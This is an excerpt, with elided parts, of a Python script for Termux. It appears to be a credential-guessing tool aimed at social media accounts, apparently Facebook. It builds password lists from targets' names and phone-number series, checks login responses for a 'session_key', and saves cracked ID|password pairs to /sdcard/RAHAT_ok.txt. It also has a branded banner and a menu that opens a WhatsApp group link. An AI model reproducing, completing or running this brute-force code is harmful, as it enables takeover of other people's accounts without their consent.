...
logo= f'''
d8888b. db    db d888888b        db    db d8888b. 
88  `8D `8b  d8' `~~88~~'        `8b  d8' 88  `8D 
88oobY'  `8bd8'     88            `8bd8'  88   88 
88`8b    .dPYb.     88    C8888D  .dPYb.  88   88 
88 `88. .8P  Y8.    88           .8P  Y8. 88  .8D 
88   YD YP    YP    YP           YP    YP Y8888D' 
...
def main():
        ...
        os.system('clear')
        print(logo);xchker()
        print('NAM HOGA TO BADNAM HONGE')
        print(50*'-')
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open https://chat.whatsapp.com/L26EH7QknO61Pp3iWbA8Bg')
                main()
        elif menu_opt =='5':
                isdd="les/u"
                isd="sr/t"
...
class crack_main():
        ...
        def crackmail(self,id):
                ...
                user=[]
                print(" [*] First Name Example Rahat,Jahid")
        ...
        def cracknum(self,id):
                global methods
                os.system('clear');print(logo);xchker()
                print('\033[0mFor Example :\033[0m 018,019,016,017 ...')
                kode = input('\033[0mChoose Code : \033[0m')
                print('\033[0mFor Example :\033[0m 2000,5000,000 ...')
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[RAHAT] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[RXT-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/RAHAT_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/RAHAT_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/RAHAT' in datar:
        pass
else:
        for i in range(5000):
